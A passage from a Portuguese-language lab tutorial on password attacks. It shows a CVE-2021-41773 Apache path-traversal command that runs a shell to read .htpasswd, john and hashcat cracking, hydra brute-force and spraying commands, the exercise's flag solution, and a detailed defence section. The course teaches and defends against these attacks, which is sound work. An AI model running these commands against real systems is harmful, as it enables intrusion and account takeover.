+$ curl -s --path-as-is -d "echo Content-Type: text/plain; echo; sha256sum /usr/local/apache2/conf/.htpasswd" \
+    "http://vulhub/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
+e0b77d8da0df7c20c41a2bd2a089ab61d64d4650ff9350fd6ab34fea9bbf0433  /usr/local/apache2/conf/.htpasswd
+```
+
+Agora quebre os hashes offline, com a rockyou (descompacte-a uma vez):
+
+```console
+$ gzip -cd /usr/share/wordlists/rockyou.txt.gz > rockyou.txt
+$ john loot.htpasswd --wordlist=rockyou.txt
+password1        (jsmith)
+password1        (operator)
+superman         (admin)
+3g 0:00:00:00 DONE ...
+```
+
+A senha do `admin` é `superman`; os 12 primeiros caracteres do SHA-256 do `.htpasswd`
+são `e0b77d8da0df`. Monte `FLAG{senha_hash}` com as duas partes.
+</Solution>
+
+Junte a senha do `admin` e o início do hash do arquivo no formato `FLAG{senha_hash}`
+(com `_` entre as partes) e valide:
+
+<FlagInput task="quebrar-a-senha-do-admin" />
+
+### 5.5 Desligar o laboratório
+
+No painel **Laboratório**, clique em **Parar** (libera a vaga do único lab ativo).
+Use **Resetar** para refazer do zero. Pela linha de comando: `scripts/lab.sh down vulhub`.
+
+## 6. Variações e aprofundamento
+
+- **Outros protocolos, mesmo hydra.** O Basic Auth foi só o módulo `http-get`. O
+  hydra fala dezenas de protocolos com a mesma estrutura `-L/-P alvo serviço`: `ssh`,
+  `ftp`, `smb`, `rdp`, `mysql`. Trocar o alvo de um login web para um SSH é trocar
+  uma palavra: `hydra -L users.txt -P small.txt ssh://192.168.0.10`.
+
+- **Formulários web (`http-post-form`).** A maioria dos logins modernos não é Basic
+  Auth, é um formulário HTML que faz `POST`. O hydra cobre isso com o módulo
+  `http-post-form`, em que você descreve o caminho, os campos e **a string que
+  aparece quando o login falha** (para o hydra saber distinguir acerto de erro):
+  `hydra -l admin -P small.txt 192.168.0.10 http-post-form "/login:user=^USER^&pass=^PASS^:F=inválido"`.
+  Descobrir a "string de falha" é metade do trabalho.
+
+- **Regras de mutação (o que o `rockyou` não cobre).** Quase ninguém usa `password`;
+  usa `Password1`, `password!`, `p@ssw0rd`. As ferramentas aplicam **regras** que
+  mutam a wordlist: `john --rules=Jumbo` ou `hashcat -r rules/best64.rule`. Elas
+  transformam uma lista de palavras em milhões de variações realistas — e são o que
+  quebra senhas "quase fortes".
+
+- **Máscaras para força bruta direcionada.** Quando você conhece o padrão (ex.: a
+  política exige 8 caracteres, 1 maiúscula, 1 dígito), uma **máscara** do hashcat
+  (`-a 3 ?u?l?l?l?l?l?d?d`) varre só o keyspace que obedece à regra, em vez do keyspace
+  inteiro. É a força bruta ficando esperta.
+
+- **Credential stuffing na vida real.** Em vez de adivinhar, o atacante alimenta a
+  ferramenta com **pares usuário+senha já vazados** (as "combolists"). Como o reúso é
+  a norma, uma fração pequena sempre funciona. É por isso que serviços sérios checam
+  as senhas contra bases de vazamentos (como o *Have I Been Pwned*) na hora do cadastro.
+
+## 7. Erros comuns
+
+- **"O hydra diz que achou TODAS as senhas / 16 senhas válidas."** Falso positivo:
+  o serviço devolve `200` para qualquer coisa (ou o caminho não exige auth). O
+  hydra se perde quando não distingue acerto de erro. Em `http-get`, garanta que o
+  caminho realmente devolve `401` sem credencial; em `http-post-form`, capriche na
+  string de falha (`F=`).
+- **"Connection refused / all children aborted."** Você está rápido ou paralelo
+  demais para o serviço (ou para o lockout). Baixe as tarefas com `-t 1` ou `-t 4` e,
+  no spraying, reduza as tentativas por conta.
+- **"O john/hashcat carrega 0 hashes."** Formato errado. Confirme o prefixo (`$apr1$`
+  é APR1 = hashcat `-m 1600`; `$6$` é sha512crypt = `-m 1800`) e, no hashcat, lembre do
+  `--username` quando a linha vier como `usuário:hash`. Rode `john` sem `--format`
+  primeiro: ele costuma detectar sozinho.
+- **"Quebrei o hash mas o login não entra."** Confira se você pegou a senha, não o
+  salt. Em `$apr1$SALT$HASH`, a senha é o texto que o `john --show` mostra depois do
+  `:`, nunca o salt.
+- **"A rockyou não existe em `/usr/share/wordlists/`."** No Kali ela vem **compactada**
+  (`rockyou.txt.gz`). Descompacte uma vez: `gzip -cd rockyou.txt.gz > rockyou.txt` (ou
+  `gunzip -k`).
+- **"Esqueci de qual arquivo tirar o SHA-256 para a flag."** É o `.htpasswd`
+  **inteiro**, como o alvo o guarda — calcule com `sha256sum` no próprio alvo (pelo
+  foothold), não no arquivo que você editou.
+
+## 8. Defesa e mitigação
+
+A visão completa fecha aqui: quem entende os dois caminhos de ataque sabe que a
+defesa também tem duas frentes — proteger o **login** (contra o online) e proteger o
+**armazenamento** (contra o offline). Precisa das duas.
+
+**1. Mate a senha fraca na origem (política de senhas moderna).** Siga o
+<GlossaryTerm term="password policy">NIST SP 800-63B</GlossaryTerm>, que virou de
+cabeça para baixo o conselho antigo:
+
+- **Comprimento acima de complexidade.** Exija no mínimo 8 (idealmente 12+)
+  caracteres e **permita** senhas longas e <GlossaryTerm term="passphrase">passphrases</GlossaryTerm>
+  (até 64 caracteres). Comprimento resiste à força bruta muito mais do que um `!` no fim.
+- **Verifique contra listas de vazamento.** Rejeite no cadastro qualquer senha que
+  esteja em bases conhecidas (a própria `rockyou`, o *Have I Been Pwned*). Isso mata o
+  dicionário e o credential stuffing de uma vez.
+- **Pare de forçar troca periódica** e de exigir composição artificial (1 maiúscula,
+  1 símbolo): o NIST mostrou que isso só produz `Senha1!`, `Senha2!`, previsíveis.
+
+**2. Trave o login (contra o ataque online).** Três medidas, em camadas:
+
+- **<GlossaryTerm term="account lockout">Account lockout</GlossaryTerm> inteligente**
+  contra o dicionário — mas lembre que o spraying passa por baixo dele (poucas
+  tentativas por conta). Por isso some com:
+- **<GlossaryTerm term="throttling">Throttling</GlossaryTerm>** (atraso crescente a
+  cada erro) e **<GlossaryTerm term="rate limiting">rate limiting</GlossaryTerm>** por
+  IP e por conta: tornam o ataque lento demais sem travar o usuário legítimo.
+- **Detecção do padrão de spraying:** muitos `401` para **contas diferentes** vindos de
+  poucas origens (ou de proxies residenciais, como na Midnight Blizzard) é a assinatura.
+  Alerte sobre isso, não só sobre muitos erros numa conta só.
+
+**3. MFA: a trava que sobrevive à senha quebrada.** Habilite
+<GlossaryTerm term="multi-factor authentication">autenticação multifator</GlossaryTerm>
+em **tudo**, inclusive — e principalmente — nas contas legadas e de serviço. Era a
+peça que faltava na conta de teste da Microsoft. Com MFA, a senha certa sozinha não
+basta: o spraying descobre o segredo e **mesmo assim** não entra.
+
+**4. Proteja o armazenamento (contra o ataque offline).** Aqui está a lição do 3.2
+virando configuração. O `.htpasswd` do lab usa APR1 — um hash **rápido**, que caiu em
+zero segundo. Troque por um hash de senha **moderno e lento**:
+
+```apache
+# htpasswd antigo (APR1 / MD5): $apr1$... — rápido, quebra fácil offline
+# Gere bcrypt, que é deliberadamente lento (fator de custo ajustável):
+htpasswd -B -C 12 /usr/local/apache2/conf/.htpasswd admin
+```
+
+O `-B` usa **bcrypt** e o `-C 12` fixa o custo. O efeito é o do quiz: a mesma rockyou
+que testava milhões de APR1 por segundo passa a testar poucos milhares de bcrypt — a
+quebra em massa de senhas fortes deixa de ser viável. Some a isso o fato de que todo
+hash moderno já traz salt, que impede <GlossaryTerm term="rainbow table">rainbow
+tables</GlossaryTerm>. E, claro: **nunca** exponha o arquivo de senhas. O vazamento do
+`.htpasswd` só foi possível porque havia a CVE-2021-41773 — tape o buraco do 5.4 e o
+caminho offline morre na raiz.
+
+## 9. Exercícios
+
+O desafio principal é o laboratório da seção 5 (a flag `FLAG{senha_hash}`): atacar o
+`/admin` pelos dois caminhos, ler o `.htpasswd` pelo foothold e quebrar o hash do
+`admin`. O quiz abaixo cobra o *porquê* — a diferença online/offline, a lógica do
+spraying, a leitura do prefixo `$apr1$`, o perigo do reúso e o efeito de um hash lento.
+
+<Quiz task="quiz-final" />
+
+**Exercício prático (opcional, sem flag).** Com o lab de pé, cruze os dois caminhos:
+(1) rode o `john` com regras (`--rules=Jumbo`) e observe se ele acha algo que a
+rockyou crua não acharia; (2) tente o mesmo `hydra` com `-t 32` (muito paralelo) e
+depois com `-t 1`, e compare o tempo e o que aparece — por que no online "mais rápido"
+nem sempre é melhor? (3) Pelo foothold, dê `cat /usr/local/apache2/conf/httpd.conf` e
+encontre o bloco `<Directory ".../admin">`: onde o Apache diz qual arquivo guarda as
+senhas?
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- Todo ataque a senha é **online** (contra o serviço vivo: lento, barulhento, freável)
+  ou **offline** (contra hashes capturados: rápido, silencioso, imparável pela defesa
+  do login). Saber qual usar — e defender — é o cerne do módulo.
+- No online, a modalidade importa: o **dicionário** dispara o lockout; o **password
+  spraying** o contorna fixando uma senha e varrendo usuários; o **credential
+  stuffing** usa segredos já vazados. O reúso de senha amplifica todos eles.
+- O **HTTP Basic Auth** é brute-forçável por ser simples: sem estado, resposta
+  binária imediata, sem freio por padrão. O `hydra` o despedaça com `http-get`.
+- O caminho **offline** é o 3.2 na prática: identifique o hash pelo prefixo (`$apr1$`
+  = APR1, rápido), leia o arquivo de senhas pelo foothold e quebre com `john`/`hashcat`
+  + rockyou.
+- Defesa em duas frentes: **login** (política de senhas NIST, lockout + throttling,
+  detecção de spraying e, acima de tudo, **MFA**) e **armazenamento** (hash moderno e
+  lento — bcrypt/Argon2 — com salt, e nunca expor o arquivo de senhas).
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP — Credential Stuffing Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html) — defesas concretas contra stuffing e spraying.
+- [NIST SP 800-63B — Digital Identity Guidelines (Authentication)](https://pages.nist.gov/800-63-3/sp800-63b.html) — a base da política de senhas moderna.
+- [MITRE ATT&CK — T1110 Brute Force](https://attack.mitre.org/techniques/T1110/) — a família catalogada: spraying (.003), stuffing (.004), guessing (.001), cracking (.002).
+- [Have I Been Pwned — Pwned Passwords](https://haveibeenpwned.com/Passwords) — a base que serviços usam para rejeitar senhas já vazadas.
